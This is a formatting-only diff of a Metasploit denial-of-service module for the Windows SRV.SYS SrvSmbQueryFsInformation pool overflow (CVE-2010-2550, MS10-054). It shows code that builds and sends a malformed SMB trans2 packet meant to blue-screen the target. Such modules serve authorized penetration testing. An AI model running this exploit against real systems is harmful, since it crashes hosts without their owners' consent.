@@ -8,39 +8,41 @@ class MetasploitModule < Msf::Auxiliary
   include Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS',
+        'Description' => %q{
           This module exploits a denial of service flaw in the Microsoft
-        Windows SMB service on versions of Windows prior to the August 2010 Patch
-        Tuesday. To trigger this bug, you must be able to access a share with
-        at least read privileges. That generally means you will need authentication.
-        However, if a system has a guest accessible share, you can trigger it
-        without any authentication.
-      },
-      'References'     =>
-        [
+          Windows SMB service on versions of Windows prior to the August 2010 Patch
+          Tuesday. To trigger this bug, you must be able to access a share with
+          at least read privileges. That generally means you will need authentication.
+          However, if a system has a guest accessible share, you can trigger it
+          without any authentication.
+        },
+        'References' => [
           ['CVE', '2010-2550'],
           ['OSVDB', '66974'],
           ['MSB', 'MS10-054'],
           ['URL', 'https://seclists.org/fulldisclosure/2010/Aug/122']
         ],
-      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'jduck' ],
-      'License'        => MSF_LICENSE
-    ))
+        'Author' => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'jduck' ],
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(445),
         OptString.new('SMBSHARE', [ true, "The name of a readable share on the server" ])
-      ])
+      ]
+    )
 
     deregister_options('SMB::ProtocolVersion')
   end
 
   # Perform a transaction2 request using the specified subcommand, parameters, and data
   def malformed_trans2(subcommand, param = '', body = '')
-
     # values < 0xc (not inclusive) causes a crash
     alloc_sz = rand(0x0c)
 
@@ -78,18 +80,16 @@ class MetasploitModule < Msf::Auxiliary
     pkt['Payload'].v['Payload'] = "\x00\x44\x20" + data
 
     exploit = pkt.to_s
-    exploit[data_offset,2] = [5].pack('v')
+    exploit[data_offset, 2] = [5].pack('v')
 
-    #print_status("\n" + Rex::Text.to_hex_dump(exploit))
+    # print_status("\n" + Rex::Text.to_hex_dump(exploit))
 
     simple.client.smb_send(exploit)
 
     # no waiting for recv :)
   end
 
-
   def run
-
     connect(versions: [1])
 
     simple.login(
@@ -110,6 +110,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("The target should encounter a blue screen error now.")
     select(nil, nil, nil, 0.5)
-
   end
 end
